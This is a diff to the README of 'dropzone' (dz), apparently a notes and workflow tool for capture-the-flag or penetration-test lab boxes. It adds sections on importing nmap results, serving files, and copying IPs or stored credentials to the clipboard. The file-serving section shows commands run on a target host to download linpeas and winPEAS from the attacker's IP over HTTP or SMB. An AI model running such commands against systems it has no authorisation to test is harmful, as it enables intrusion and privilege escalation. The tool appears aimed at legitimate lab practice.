@@ -9,6 +9,9 @@ Everything runs through `dz`. Without options it opens the menu; with options it
 - [Change IP](#change-ip)
 - [Load, view, info, unload](#load-view-info-unload)
 - [More hosts in a box](#more-hosts-in-a-box)
+- [Ports from nmap](#ports-from-nmap)
+- [Serve files](#serve-files)
+- [Copy to the clipboard](#copy-to-the-clipboard)
 - [Done, archive, open note](#done-archive-open-note)
 - [Flags, timeline, screenshots](#flags-timeline-screenshots)
 - [Creds](#creds)
@@ -28,6 +31,9 @@ Everything runs through `dz`. Without options it opens the menu; with options it
 | `-v` | view all boxes, `--all` includes the archive |
 | `-i` | show the loaded box |
 | `-x` | unload the box |
+| `-p [file]` | open ports from your own nmap output into the note |
+| `serve [smb] [dir] [port]` | HTTP server (or SMB share) with download commands that have your IP in them |
+| `-cp [what]` | copy the target IP, a host, your IP or a cred to the clipboard |
 | `-t [host]` | hosts in the box: list them, or make `<host>` the target |
 | `-t <host> -ip <ip> [-h ...]` | add or change a host; `--drop` removes it |
 | `-o [name]` | open the note (editor, or Obsidian with `notes = vault`) |
@@ -48,7 +54,7 @@ Everything runs through `dz`. Without options it opens the menu; with options it
 | `--version` | version |
 | `-h`, `--help` | help (`-h` without a value, `--help` anywhere) |
 
-One action per call: `-n`, `-l`, `-v`, `-i`, `-x`, `-t`, `-o`, `-d`, `-a`, `-f`, `-j`, `-s`, `-c` or `-r`. Tab completion knows every option and fills in box names after `-l`, `-r`, `-o`, `-d` and `-a` (archived ones too after `-l`, `-o` and `-d`).
+One action per call: `-n`, `-l`, `-v`, `-i`, `-x`, `-t`, `-p`, `-cp`, `-o`, `-d`, `-a`, `-f`, `-j`, `-s`, `-c` or `-r`. Tab completion knows every option and fills in box names after `-l`, `-r`, `-o`, `-d` and `-a` (archived ones too after `-l`, `-o` and `-d`).
 
 ## New box
 
@@ -121,6 +127,49 @@ dz -t dc01 --drop                                          # remove it
 | Names | lowercase letters, digits and `-`, like `dc01` or `ms-02` |
 
 `dz -ip` and `dz -h` without `-t` always change the main host. `dz -i` and `dz -v` show the extra hosts.
+
+## Ports from nmap
+
+dropzone never scans. You run nmap yourself, and `dz -p` reads what it found:
+
+```bash
+nmap -p- -oA scans/all $TARGET_IP      # -oA writes .xml, .nmap and .gnmap
+dz -p                                  # the newest .xml or .gnmap in scans/
+dz -p scans/udp.gnmap                  # a given file
+```
+
+- Every **open** port becomes a row in the first table under `## Ports` (or `### Poorten`): port, protocol, service and version. The columns are matched by name (Port, Proto, State, Service, Version, Notes), so your own template works. Without a Proto column the port reads `22/tcp`.
+- Rows that are already there stay as they are, notes included. Run it again after a second scan: only new ports are added.
+- IPs are matched to the hosts of the box (`dz -t`), so one scan of a whole AD set lands under the right host. With more than one host the host name goes into the Host column, or the Notes column. Other IPs are skipped with a message.
+- A timeline line says what was added.
+
+## Serve files
+
+```bash
+dz serve                      # the current folder on port 80
+dz serve ~/tools 8000         # a folder and a port
+dz serve smb ~/tools          # an SMB share (impacket-smbserver)
+```
+
+It prints what to type on the target, with your `$ATTACKER_IP`, then starts the server (Ctrl-C stops it):
+
+| | Linux | Windows |
+|---|---|---|
+| HTTP | `wget http://10.10.14.7/linpeas.sh -O /tmp/linpeas.sh` | `iwr http://10.10.14.7/winPEAS.exe -OutFile ...` |
+| SMB | | `copy \\10.10.14.7\share\winPEAS.exe .` |
+
+Needs `python3`, and `impacket-smbserver` for SMB. If your VPN interface is down it tells you, instead of printing a wrong IP.
+
+## Copy to the clipboard
+
+```bash
+dz -cp            # the target IP
+dz -cp dc01       # a host in the box
+dz -cp me         # your IP on the VPN
+dz -cp pass       # the password of the active cred (not shown on screen)
+```
+
+Also `domain`, `targets`, `user` and `hash`. It uses `wl-copy`, `xclip` or `xsel`, whichever fits your session; tab completion lists the choices. Without a desktop session it prints the value, so `$(dz -cp dc01)` works in a command.
 
 ## Done, archive, open note
 
